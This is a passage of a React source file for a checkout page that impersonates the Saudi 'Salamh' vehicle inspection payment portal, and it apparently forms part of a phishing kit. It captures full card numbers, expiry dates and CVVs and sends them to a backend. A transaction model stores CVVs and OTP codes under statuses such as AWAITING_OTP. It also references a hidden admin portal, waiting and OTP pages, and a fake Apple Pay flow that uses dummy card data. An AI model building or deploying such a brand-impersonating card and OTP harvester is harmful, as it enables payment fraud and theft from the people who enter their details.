import React, { useState, useEffect, useMemo } from 'react';
import { HashRouter, Routes, Route, Link, useNavigate, useLocation, Navigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'motion/react';
import {
  CreditCard as CardIcon,
  ShieldCheck,
  LayoutDashboard,
  CheckCircle,
  AlertCircle,
  Clock,
  ArrowRight,
  User,
  Calendar,
  Lock,
  ArrowUpRight,
  RefreshCw,
  Search,
  Filter,
  Trash2,
  ExternalLink,
  Terminal,
  Smartphone
} from 'lucide-react';
import { CreditCard3D } from './components/CreditCard3D';
import { WaitingApprovalPage } from './components/WaitingApprovalPage';
import { OTPPage } from './components/OTPPage';
import { AdminPortal } from './components/AdminPortal';
import {
  validateLuhn,
  getCardType,
  formatCardNumber,
  validateExpiry,
  validateCVV,
  validateName,
  CardType
} from './lib/validation';

// Define Transaction interface for backend communication
interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: CardType;
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED';
  otpCode: string;
  submittedOtp?: string;
}

// Global Navigation Header Component
const Header: React.FC = () => {
  const location = useLocation();
  const isAdminPath = location.pathname === '/dashboard' || location.pathname === '/admin-portal';

  if (isAdminPath) {
    return (
      <header className="sticky top-0 z-40 w-full border-b border-slate-800 bg-slate-950/80 backdrop-blur-md">
        <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6">
          <div className="flex items-center space-x-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-tr from-emerald-500 to-teal-400 p-0.5 shadow-lg shadow-emerald-500/10">
              <div className="flex h-full w-full items-center justify-center rounded-[10px] bg-slate-900">
                <ShieldCheck className="h-5 w-5 text-emerald-400" />
              </div>
            </div>
            <div>
              <h1 className="text-sm font-bold text-white tracking-tight">3D SECUREPAY ADMIN</h1>
              <p className="text-[10px] font-mono text-slate-400">CREDIT ENGINE v2.4</p>
            </div>
          </div>

          <nav className="flex space-x-1 sm:space-x-2">
            <Link
              to="/"
              className="flex items-center space-x-2 rounded-lg px-3 py-1.5 text-xs font-medium text-slate-400 hover:bg-slate-900 hover:text-slate-200 transition-all"
            >
              <CardIcon className="h-3.5 w-3.5" />
              <span>Checkout Terminal</span>
            </Link>
          </nav>
        </div>
      </header>
    );
  }

  // Customer-facing light mode header (Salamh style!)
  return (
    <header className="sticky top-0 z-40 w-full border-b border-gray-100 bg-white shadow-sm font-sans">
      <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6">
        
        {/* Left side: Navigation / Admin trigger (Removed as requested) */}
        <div className="flex items-center space-x-3 space-x-reverse">
        </div>

        {/* Right side: Salamh Logo and Title */}
        <div className="flex items-center gap-3 dir-rtl text-right">
          <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-[#004d33] p-0.5 shadow-md shadow-emerald-950/15">
            <div className="flex h-full w-full items-center justify-center rounded-[10px] bg-white">
              <ShieldCheck className="h-5 w-5 text-[#004d33]" />
            </div>
          </div>
          <div>
            <h1 className="text-sm font-extrabold text-slate-900 tracking-tight leading-none">سلامة لفحص المركبات</h1>
            <p className="text-[10px] text-[#004d33] font-extrabold mt-1">بوابة الدفع الإلكتروني الموحدة</p>
          </div>
        </div>

      </div>
    </header>
  );
};

interface ServiceItem {
  id: string;
  name: string;
  price: string;
  category: string;
  duration: string;
}

const VEHICLE_SERVICES: ServiceItem[] = [
  { id: 'srv-1', name: 'فحص دوري للمركبة', price: '150.00', category: 'الفحص الدوري', duration: '30-45 دقيقة' },
  { id: 'srv-2', name: 'إعادة فحص المركبة', price: '50.00', category: 'إعادة الفحص', duration: '15-20 دقيقة' },
  { id: 'srv-3', name: 'تقرير فحص فني معتمد', price: '75.00', category: 'التقارير المعتمدة', duration: 'فوري' },
  { id: 'srv-4', name: 'فحص شامل قبل الشراء', price: '350.00', category: 'الفحص الشامل', duration: '60 دقيقة' },
  { id: 'srv-5', name: 'خدمة فحص وتوجيه عامة', price: '100.00', category: 'خدمات عامة', duration: '30 دقيقة' }
];

// Checkout Page component
const CheckoutPage: React.FC = () => {
  const navigate = useNavigate();
  
  // Custom Flow States (Step 1: Service selection, Step 2: Payment details)
  const [step, setStep] = useState<1 | 2>(1);
  const [selectedService, setSelectedService] = useState<ServiceItem>(VEHICLE_SERVICES[0]);

  // Card Form states
  const [cardNumber, setCardNumber] = useState('');
  const [holderName, setHolderName] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [amount, setAmount] = useState('150.00'); // Set default to match the first service
  
  // Payment states
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'mada' | 'applepay' | null>(null);
  const [isApplePaying, setIsApplePaying] = useState(false);

  // UI states
  const [isFlipped, setIsFlipped] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [touched, setTouched] = useState<{ [key: string]: boolean }>({});
  const [formError, setFormError] = useState<string | null>(null);

  useEffect(() => {
    if (formError) {
      const timer = setTimeout(() => setFormError(null), 5000);
      return () => clearTimeout(timer);
    }
  }, [formError]);

  // Real-time card properties
  const cardType = useMemo(() => getCardType(cardNumber), [cardNumber]);

  // Calculations for Payment Summary (ملخص الدفع)
  const serviceFee = useMemo(() => {
    const amt = parseFloat(amount) || 0;
    return (amt * 0.85).toFixed(2);
  }, [amount]);

  const bookingFee = useMemo(() => {
    const amt = parseFloat(amount) || 0;
    return (amt * 0.15).toFixed(2);
  }, [amount]);

  // Form Validations
  const errors = useMemo(() => {
    const errs: { [key: string]: string } = {};
    
    if (paymentMethod === 'applepay' || !paymentMethod) return errs;

    const cleanNum = cardNumber.replace(/\D/g, '');
    if (cleanNum.length > 0) {
      if (cleanNum.length < 13 || cleanNum.length > 19) {
        errs.cardNumber = 'يجب أن يتكون رقم البطاقة من 13 إلى 19 رقماً';
      } else if (!validateLuhn(cleanNum)) {
        errs.cardNumber = 'رقم البطاقة غير صالح (فشل في التحقق من Luhn)';
      }
    } else {
      errs.cardNumber = 'رقم البطاقة مطلوب';
    }

    if (holderName.trim().length > 0) {
      if (!validateName(holderName)) {
        errs.holderName = 'يجب أن يحتوي اسم حامل البطاقة على أحرف فقط';
      }
    } else {
      errs.holderName = 'اسم حامل البطاقة مطلوب';
    }

    if (expiry.length > 0) {
      if (!validateExpiry(expiry)) {
        errs.expiry = 'تاريخ الانتهاء غير صالح (MM/YY)';
      }
    } else {
      errs.expiry = 'تاريخ الانتهاء مطلوب';
    }

    if (cvv.length > 0) {
      if (!validateCVV(cvv, cardType)) {
        const reqLen = cardType === 'amex' ? 4 : 3;
        errs.cvv = `الرمز السري يجب أن يكون ${reqLen} أرقام`;
      }
    } else {
      errs.cvv = 'الرمز السري مطلوب';
    }

    const amtNum = parseFloat(amount);
    if (isNaN(amtNum) || amtNum <= 0) {
      errs.amount = 'يرجى إدخال مبلغ دفع صحيح';
    }

    return errs;
  }, [cardNumber, holderName, expiry, cvv, amount, cardType, paymentMethod]);

  const isFormValid = Object.keys(errors).length === 0;

  // Handle Form Inputs with Masking/Formatting
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target.value;
    const clean = input.replace(/\D/g, '');
    const detectedType = getCardType(clean);
    
    // Max lengths: 15 for Amex, 16 for others
    const maxLen = detectedType === 'amex' ? 15 : 16;
    const capped = clean.slice(0, maxLen);
    
    const formatted = formatCardNumber(capped, detectedType);
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let input = e.target.value.replace(/\D/g, '');
    if (input.length > 4) input = input.slice(0, 4);

    if (input.length > 2) {
      setExpiry(`${input.slice(0, 2)}/${input.slice(2)}`);
    } else {
      setExpiry(input);
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target.value.replace(/\D/g, '');
    const maxLen = cardType === 'amex' ? 4 : 3;
    setCvv(input.slice(0, maxLen));
  };

  const handleBlur = (field: string) => {
    setTouched(prev => ({ ...prev, [field]: true }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!paymentMethod) return;
    
    if (paymentMethod === 'applepay') {
      setIsApplePaying(true);
      setTimeout(async () => {
        try {
          const response = await fetch('/api/pay', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              cardNumber: '•••• •••• •••• 9924',
              cardholderName: 'Apple Pay User',
              expiry: '12/30',
              cvv: '000',
              cardType: 'visa',
              amount: parseFloat(amount),
              serviceName: selectedService.name
            })
          });
          const data = await response.json();
          setIsApplePaying(false);
          if (data.success) {
            navigate('/waiting', { state: { tx: data.transaction } });
          } else {
            setFormError(data.error || 'فشلت عملية الدفع بواسطة Apple Pay.');
          }
        } catch (err) {
          console.error(err);
          setFormError('حدث خطأ أثناء الاتصال بشبكة الدفع.');
          setIsApplePaying(false);
        }
      }, 2000);
      return;
    }

    setTouched({
      cardNumber: true,
      holderName: true,
      expiry: true,
      cvv: true,
      amount: true
    });

    if (!isFormValid) return;

    setIsSubmitting(true);

    try {
      const response = await fetch('/api/pay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardNumber,
          cardholderName: holderName,
          expiry,
          cvv,
          cardType: paymentMethod === 'mada' ? 'visa' : cardType,
          amount: parseFloat(amount),
          serviceName: selectedService.name
        })
      });

      const data = await response.json();

      if (data.success) {
        setTimeout(() => {
          navigate('/waiting', { state: { tx: data.transaction } });
        }, 1500);
      } else {
        setFormError(data.error || 'فشلت عملية الدفع.');
        setIsSubmitting(false);
      }
    } catch (err) {
      console.error(err);
      setFormError('حدث خطأ أثناء الاتصال بشبكة الدفع المعتمدة.');
      setIsSubmitting(false);
    }
  };

  return (
    <div className="mx-auto max-w-xl px-4 py-8 sm:px-6">
      
      {/* Centered White Container Card */}
      <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
        
        {/* Decorative Top Accent Bar */}
        <div className="h-2 bg-[#004d33] w-full" />

        <div className="p-6 sm:p-8 space-y-6">

          {/* Step Indicator */}
          <div className="flex items-center justify-between border-b border-gray-100 pb-4 dir-rtl">
            <div className="flex items-center space-x-2 space-x-reverse">
              <span className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-black transition-colors ${step === 1 ? 'bg-[#004d33] text-white' : 'bg-emerald-100 text-[#004d33]'}`}>
                ١
              </span>
              <span className={`text-xs font-extrabold transition-colors ${step === 1 ? 'text-slate-900' : 'text-slate-400'}`}>
                اختيار الخدمة
              </span>
            </div>
            <div className="flex-1 mx-4 h-0.5 bg-gray-100 relative">
              <div className={`absolute inset-y-0 right-0 bg-[#004d33] transition-all duration-300 ${step === 1 ? 'w-0' : 'w-full'}`} />
            </div>
            <div className="flex items-center space-x-2 space-x-reverse">
              <span className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-black transition-colors ${step === 2 ? 'bg-[#004d33] text-white' : 'bg-gray-100 text-gray-400'}`}>
                ٢
              </span>
              <span className={`text-xs font-extrabold transition-colors ${step === 2 ? 'text-slate-900' : 'text-slate-400'}`}>
                الدفع الإلكتروني
              </span>
            </div>
          </div>

          <AnimatePresence mode="wait">
            {step === 1 ? (
              <motion.div
                key="step-services"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.25 }}
                className="space-y-4 dir-rtl text-right"
              >
                <div className="space-y-1">
                  <h3 className="text-sm font-extrabold text-slate-800">اختر الخدمة الفنية المطلوبة</h3>
                  <p className="text-xs text-slate-400">يرجى تحديد الخدمة المطلوبة من الفحص الدوري لمركبتك للمتابعة والدفع الإلكتروني.</p>
                </div>

                <div className="space-y-3">
                  {VEHICLE_SERVICES.map((srv) => {
                    const isSelected = selectedService.id === srv.id;
                    return (
                      <button
                        key={srv.id}
                        type="button"
                        onClick={() => {
                          setSelectedService(srv);
                          setAmount(srv.price);
                        }}
                        className={`w-full flex items-center justify-between p-4 rounded-xl border-2 transition-all cursor-pointer text-right relative overflow-hidden ${
                          isSelected
                            ? 'border-[#004d33] bg-[#004d33]/5 ring-1 ring-[#004d33]'
                            : 'border-gray-100 bg-gray-50/50 hover:bg-gray-50'
                        }`}
                      >
                        <div className="flex items-start space-x-3 space-x-reverse">
                          <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center mt-0.5 shrink-0 transition-colors ${isSelected ? 'border-[#004d33] bg-[#004d33]' : 'border-gray-300'}`}>
                            {isSelected && <div className="w-1.5 h-1.5 rounded-full bg-white" />}
                          </div>
                          <div>
                            <span className="inline-block text-[9px] font-extrabold bg-[#004d33]/10 text-[#004d33] px-2 py-0.5 rounded-full mb-1">
                              {srv.category}
                            </span>
                            <h4 className="text-xs font-black text-slate-800">{srv.name}</h4>
                            <p className="text-[10px] text-slate-400 font-medium mt-0.5">⏱️ المدة التقديرية: {srv.duration}</p>
                          </div>
                        </div>
                        <div className="text-left font-sans">
                          <span className="text-xs font-black text-[#004d33]">{srv.price}</span>
                          <span className="text-[9px] text-slate-400 font-bold block">ر.س</span>
                        </div>
                      </button>
                    );
                  })}
                </div>

                {/* Next Button */}
                <button
                  type="button"
                  onClick={() => setStep(2)}
                  className="w-full flex items-center justify-center gap-2 rounded-xl bg-[#004d33] hover:bg-[#003a26] px-4 py-3.5 text-sm font-bold text-white shadow-lg shadow-emerald-950/15 transition-all hover:scale-[1.01] active:scale-[0.99] mt-6 cursor-pointer"
                >
                  <span className="font-sans font-extrabold text-base">الخطوة التالية: الانتقال للدفع</span>
                  <ArrowRight className="h-4 w-4 rotate-180 text-white/90" />
                </button>
              </motion.div>
            ) : (
              <motion.div
                key="step-payment"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                transition={{ duration: 0.25 }}
                className="space-y-6 dir-rtl text-right"
              >
                {/* Back Button */}
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="text-xs font-bold text-[#004d33] hover:text-[#003a26] flex items-center gap-1.5 bg-gray-50 hover:bg-gray-100 px-3 py-1.5 rounded-lg border border-gray-200 transition-colors w-fit cursor-pointer"
                >
                  <ArrowRight className="h-3.5 w-3.5 text-[#004d33]" />
                  <span>تغيير الخدمة المختارة</span>
                </button>

                {/* Active Service Badge */}
                <div className="bg-emerald-50/50 border border-emerald-100/80 rounded-xl p-3.5 flex items-center justify-between">
                  <div className="text-right">
                    <span className="inline-block text-[9px] font-extrabold bg-[#004d33]/10 text-[#004d33] px-2 py-0.5 rounded-full">الخدمة المطلوبة</span>
                    <h4 className="text-xs font-black text-slate-800 mt-1">{selectedService.name}</h4>
                  </div>
                  <div className="text-left font-sans text-xs">
                    <span className="text-[#004d33] font-black">{selectedService.price} ر.س</span>
                  </div>
                </div>

                {/* 1. Payment Summary Section (ملخص الدفع) */}
                <div className="border-2 border-dashed border-[#004d33]/20 bg-[#004d33]/5 p-4 rounded-xl">
                  <h3 className="text-sm font-extrabold text-[#004d33] mb-2">ملخص الدفع</h3>
                  <div className="space-y-1.5 text-xs text-slate-600">
                    <div className="flex justify-between items-center">
                      <span>رسوم الخدمة:</span>
                      <span className="font-mono">{serviceFee} ر.س</span>
                    </div>
                    <div className="flex justify-between items-center pb-2 border-b border-[#004d33]/10">
                      <span>رسوم الحجز:</span>
                      <span className="font-mono">{bookingFee} ر.س</span>
                    </div>
                    <div className="flex justify-between items-center pt-1.5 text-slate-950 font-extrabold text-sm">
                      <span>المبلغ الإجمالي:</span>
                      <span className="font-mono text-base text-[#004d33]">{amount} ر.س</span>
                    </div>
                  </div>
                </div>

                {/* 2. Selector Grid for Payment Methods (طريقة الدفع المفضلة) */}
                <div>
                  <label className="block text-right text-xs font-bold text-slate-700 mb-2.5">طريقة الدفع المفضلة</label>
                  
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                    {/* Visa / Mastercard */}
                    <button
                      type="button"
                      onClick={() => setPaymentMethod('card')}
                      className={`flex items-center justify-between p-3 rounded-xl border-2 transition-all cursor-pointer text-right ${
                        paymentMethod === 'card'
                          ? 'border-sky-400 bg-sky-50/20 ring-1 ring-sky-300 shadow-sm'
                          : 'border-gray-200 hover:border-gray-300 bg-white'
                      }`}
                    >
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className={`w-4 h-4 rounded-full border flex items-center justify-center shrink-0 ${paymentMethod === 'card' ? 'border-sky-500' : 'border-gray-300'}`}>
                          {paymentMethod === 'card' && <div className="w-2.5 h-2.5 rounded-full bg-sky-500" />}
                        </div>
                        <div>
                          <p className="text-xs font-extrabold text-slate-800">فيزا / ماستر</p>
                        </div>
                      </div>
                      <div className="flex items-center space-x-1 space-x-reverse select-none shrink-0 scale-90">
                        <span className="text-[9px] font-black italic text-blue-800 tracking-tighter bg-blue-50 px-1 py-0.5 rounded border border-blue-200">VISA</span>
                      </div>
                    </button>

                    {/* Mada (مدى) */}
                    <button
                      type="button"
                      onClick={() => setPaymentMethod('mada')}
                      className={`flex items-center justify-between p-3 rounded-xl border-2 transition-all cursor-pointer text-right ${
                        paymentMethod === 'mada'
                          ? 'border-sky-400 bg-sky-50/20 ring-1 ring-sky-300 shadow-sm'
                          : 'border-gray-200 hover:border-gray-300 bg-white'
                      }`}
                    >
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className={`w-4 h-4 rounded-full border flex items-center justify-center shrink-0 ${paymentMethod === 'mada' ? 'border-sky-500' : 'border-gray-300'}`}>
                          {paymentMethod === 'mada' && <div className="w-2.5 h-2.5 rounded-full bg-sky-500" />}
                        </div>
                        <div>
                          <p className="text-xs font-extrabold text-slate-800">مدى (Mada)</p>
                        </div>
                      </div>
                      <div className="select-none shrink-0 bg-[#00b4d8] text-white px-1.5 py-0.5 rounded text-[8px] font-black shadow-sm">
                        مدى
                      </div>
                    </button>

                    {/* Apple Pay */}
                    <button
                      type="button"
                      onClick={() => setPaymentMethod('applepay')}
                      className={`flex items-center justify-between p-3 rounded-xl border-2 transition-all cursor-pointer text-right ${
                        paymentMethod === 'applepay'
                          ? 'border-sky-400 bg-sky-50/20 ring-1 ring-sky-300 shadow-sm'
                          : 'border-gray-200 hover:border-gray-300 bg-white'
                      }`}
                    >
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className={`w-4 h-4 rounded-full border flex items-center justify-center shrink-0 ${paymentMethod === 'applepay' ? 'border-sky-500' : 'border-gray-300'}`}>
                          {paymentMethod === 'applepay' && <div className="w-2.5 h-2.5 rounded-full bg-sky-500" />}
                        </div>
                        <div>
                          <p className="text-xs font-extrabold text-slate-800">Apple Pay</p>
                        </div>
                      </div>
                      <div className="bg-black text-white px-1.5 py-0.5 rounded text-[8px] font-bold shadow-sm">
                         Pay
                      </div>
                    </button>
                  </div>
                </div>

                {/* 3. Charge Amount control (highly polished & styled) - Always visible */}
                <div className="space-y-2">
                  <div className="rounded-xl bg-gray-50 p-4 border border-gray-100 flex items-center justify-between">
                    <div className="text-right">
                      <label htmlFor="amount" className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider">
                        قيمة المعاملة (ر.س)
                      </label>
                      <input
                        type="number"
                        id="amount"
                        step="0.01"
                        min="1"
                        readOnly
                        className="mt-1 bg-transparent border-0 text-slate-900 font-sans text-2xl font-black focus:ring-0 focus:outline-none p-0 w-32 text-right opacity-80"
                        value={amount}
                      />
                    </div>
                    <div className="text-left select-none">
                      <span className="text-xs font-extrabold text-[#004d33] block">منصة سلامة</span>
                      <p className="text-[9px] text-[#004d33] font-black">سعر الخدمة معتمد</p>
                    </div>
                  </div>
                  {touched.amount && errors.amount && (
                    <p className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 justify-start">
                      <AlertCircle className="h-3.5 w-3.5" />
                      <span>{errors.amount}</span>
                    </p>
                  )}
                </div>

                {/* 4. Interactive payment form */}
                <form onSubmit={handleSubmit} className="space-y-6 text-right">
            <AnimatePresence mode="wait">
              {!paymentMethod ? (
                <motion.div
                  key="no-selection-placeholder"
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  transition={{ duration: 0.25 }}
                  className="p-8 text-center bg-gray-50/50 rounded-2xl border border-dashed border-gray-200 flex flex-col items-center justify-center space-y-3"
                >
                  <div className="w-14 h-14 rounded-full bg-slate-100 flex items-center justify-center text-slate-400">
                    <CardIcon className="h-6 w-6" />
                  </div>
                  <div className="space-y-1">
                    <h4 className="text-sm font-extrabold text-slate-700">يرجى اختيار طريقة الدفع</h4>
                    <p className="text-xs text-slate-400 max-w-xs mx-auto leading-relaxed">
                      الرجاء اختيار وسيلة الدفع المفضلة لديك أعلاه لعرض بطاقة الدفع وتفاصيل المعاملة بشكل آمن.
                    </p>
                  </div>
                </motion.div>
              ) : (
                <motion.div
                  key="active-payment-container"
                  initial={{ opacity: 0, y: 15 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -15 }}
                  transition={{ duration: 0.35, ease: 'easeOut' }}
                  className="space-y-6"
                >
                  {/* Interactive 3D Card Visualizer (صورة البطاقة) */}
                  <div className="p-4 flex flex-col items-center justify-center bg-gray-50/50 rounded-2xl border border-gray-100/50">
                    <div className="mb-4 text-center">
                      <span className="inline-flex items-center gap-1.5 rounded-full bg-emerald-50 px-3 py-1 text-xs font-bold text-[#004d33] ring-1 ring-inset ring-emerald-600/10">
                        <span className="relative flex h-2.5 w-2.5">
                          <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75"></span>
                          <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-emerald-500"></span>
                        </span>
                        <span>نظام تحقق ثلاثي الأبعاد نشط</span>
                      </span>
                    </div>

                    <div className="relative animate-float py-2">
                      <CreditCard3D
                        cardNumber={paymentMethod === 'applepay' ? '•••• •••• •••• 9924' : cardNumber}
                        cardholderName={paymentMethod === 'applepay' ? 'APPLE PAY USER' : holderName}
                        expiry={paymentMethod === 'applepay' ? '12/30' : expiry}
                        cvv={paymentMethod === 'applepay' ? '•••' : cvv}
                        cardType={paymentMethod === 'mada' ? 'mada' : (paymentMethod === 'applepay' ? 'applepay' : cardType)}
                        isFlipped={isFlipped}
                      />
                    </div>

                    <div className="mt-4 text-center max-w-sm text-xs font-bold text-slate-500 space-y-1">
                      <p className="text-slate-700 text-[11px] sm:text-xs">تتحرك البطاقة تفاعلياً مع حركة مؤشر الفأرة</p>
                      <p className="font-medium text-slate-400 text-[10px] sm:text-[11px] hidden sm:block">عند التركيز على حقل الرمز السري (CVV)، ستدور البطاقة تلقائياً لعرض الواجهة الخلفية.</p>
                    </div>
                  </div>

            {/* 5. Conditional Input Fields or Apple Pay button */}
            <AnimatePresence mode="wait">
              {paymentMethod === 'applepay' ? (
                <motion.div
                  key="applepay-cta"
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  className="py-10 text-center flex flex-col items-center justify-center space-y-4"
                >
                  <div className="w-16 h-16 rounded-full bg-slate-100 flex items-center justify-center border border-gray-200">
                    <Smartphone className="h-8 w-8 text-slate-800 animate-pulse" />
                  </div>
                  <div>
                    <h4 className="text-sm font-extrabold text-slate-800">الدفع الفوري بلمسة واحدة</h4>
                    <p className="text-xs text-slate-500 mt-1">سيتم تفعيل المصادقة الحيوية لجهازك عبر بوابة Apple Pay الرسمية.</p>
                  </div>

                  <button
                    type="submit"
                    disabled={isApplePaying}
                    className="w-full max-w-sm h-13 bg-black hover:bg-zinc-900 text-white rounded-xl font-bold text-sm transition-all shadow-md flex items-center justify-center gap-2"
                  >
                    {isApplePaying ? (
                      <>
                        <RefreshCw className="h-4 w-4 animate-spin text-white" />
                        <span>جاري التحقق والمصادقة بيومترياً...</span>
                      </>
                    ) : (
                      <>
                        <span className="text-base font-black"> Pay</span>
                        <span>الدفع السريع الآن</span>
                      </>
                    )}
                  </button>
                </motion.div>
              ) : (
                <motion.div
                  key="standard-form"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="space-y-4"
                >
                  {/* Cardholder Name */}
                  <div className="space-y-1.5">
                    <label htmlFor="holderName" className="flex items-center gap-1.5 text-xs font-bold text-slate-700 justify-start">
                      <User className="h-3.5 w-3.5 text-slate-400" />
                      <span>اسم حامل البطاقة (بالأحرف اللاتينية)</span>
                    </label>
                    <input
                      type="text"
                      id="holderName"
                      placeholder="مثال: MOHAMMAD AL-OTAIBI"
                      className={`w-full rounded-xl border bg-white px-4 py-3 text-sm text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 transition text-right font-sans ${
                        touched.holderName && errors.holderName
                          ? 'border-rose-300 focus:ring-rose-500/10 focus:border-rose-500'
                          : 'border-gray-200 focus:border-[#004d33] focus:ring-[#004d33]/15'
                      }`}
                      value={holderName}
                      onChange={(e) => setHolderName(e.target.value)}
                      onBlur={() => handleBlur('holderName')}
                    />
                    {touched.holderName && errors.holderName && (
                      <p className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 justify-start">
                        <AlertCircle className="h-3.5 w-3.5" />
                        <span>{errors.holderName}</span>
                      </p>
                    )}
                  </div>

                  {/* Card Number */}
                  <div className="space-y-1.5">
                    <label htmlFor="cardNumber" className="flex items-center gap-1.5 text-xs font-bold text-slate-700 justify-start">
                      <CardIcon className="h-3.5 w-3.5 text-slate-400" />
                      <span>رقم البطاقة الائتمانية</span>
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        id="cardNumber"
                        placeholder="4111 1111 1111 1111"
                        className={`w-full rounded-xl border bg-white pl-4 pr-12 py-3 text-sm font-mono text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 transition text-left ${
                          touched.cardNumber && errors.cardNumber
                            ? 'border-rose-300 focus:ring-rose-500/10 focus:border-rose-500'
                            : 'border-gray-200 focus:border-[#004d33] focus:ring-[#004d33]/15'
                        }`}
                        value={cardNumber}
                        onChange={handleCardNumberChange}
                        onBlur={() => handleBlur('cardNumber')}
                      />
                      {/* Small absolute logo selector on left of card input */}
                      <div className="absolute left-4 top-1/2 -translate-y-1/2 select-none h-6 flex items-center">
                        {cardType !== 'unknown' ? (
                          <span className="text-[9px] font-black uppercase bg-slate-100 px-1.5 py-0.5 rounded border border-gray-200 text-[#004d33]">
                            {cardType}
                          </span>
                        ) : (
                          <CardIcon className="h-4 w-4 text-slate-300" />
                        )}
                      </div>
                    </div>
                    {touched.cardNumber && errors.cardNumber && (
                      <p className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 justify-start">
                        <AlertCircle className="h-3.5 w-3.5" />
                        <span>{errors.cardNumber}</span>
                      </p>
                    )}
                  </div>

                  {/* Row for Expiry and CVV */}
                  <div className="grid grid-cols-2 gap-4">
                    {/* Expiry Date */}
                    <div className="space-y-1.5">
                      <label htmlFor="expiry" className="flex items-center gap-1.5 text-xs font-bold text-slate-700 justify-start">
                        <Calendar className="h-3.5 w-3.5 text-slate-400" />
                        <span>تاريخ انتهاء الصلاحية</span>
                      </label>
                      <input
                        type="text"
                        id="expiry"
                        placeholder="MM/YY"
                        className={`w-full rounded-xl border bg-white px-4 py-3 text-sm font-mono text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 transition text-center ${
                          touched.expiry && errors.expiry
                            ? 'border-rose-300 focus:ring-rose-500/10 focus:border-rose-500'
                            : 'border-gray-200 focus:border-[#004d33] focus:ring-[#004d33]/15'
                        }`}
                        value={expiry}
                        onChange={handleExpiryChange}
                        onBlur={() => handleBlur('expiry')}
                      />
                      {touched.expiry && errors.expiry && (
                        <p className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 justify-start">
                          <AlertCircle className="h-3.5 w-3.5" />
                          <span>{errors.expiry}</span>
                        </p>
                      )}
                    </div>

                    {/* CVV */}
                    <div className="space-y-1.5">
                      <label htmlFor="cvv" className="flex items-center gap-1.5 text-xs font-bold text-slate-700 justify-start">
                        <Lock className="h-3.5 w-3.5 text-slate-400" />
                        <span>الرمز السري (CVV)</span>
                      </label>
                      <input
                        type="password"
                        id="cvv"
                        placeholder={cardType === 'amex' ? '1234' : '123'}
                        className={`w-full rounded-xl border bg-white px-4 py-3 text-sm font-mono text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 transition text-center ${
                          touched.cvv && errors.cvv
                            ? 'border-rose-300 focus:ring-rose-500/10 focus:border-rose-500'
                            : 'border-gray-200 focus:border-[#004d33] focus:ring-[#004d33]/15'
                        }`}
                        value={cvv}
                        onChange={handleCvvChange}
                        onFocus={() => setIsFlipped(true)}
                        onBlur={() => {
                          setIsFlipped(false);
                          handleBlur('cvv');
                        }}
                      />
                      {touched.cvv && errors.cvv && (
                        <p className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 justify-start">
                          <AlertCircle className="h-3.5 w-3.5" />
                          <span>{errors.cvv}</span>
                        </p>
                      )}
                    </div>
                  </div>

                  {formError && (
                    <div className="rounded-xl border border-rose-200 bg-rose-50 p-4 text-xs text-rose-700 flex items-center gap-2 animate-pulse justify-start">
                      <AlertCircle className="h-4 w-4 shrink-0 text-rose-600" />
                      <span>{formError}</span>
                    </div>
                  )}

                  {/* Submit Button */}
                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className="relative mt-6 flex w-full items-center justify-center gap-2 rounded-xl bg-[#004d33] hover:bg-[#003a26] px-4 py-4 text-sm font-bold text-white shadow-lg shadow-emerald-950/15 transition-all hover:scale-[1.01] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none"
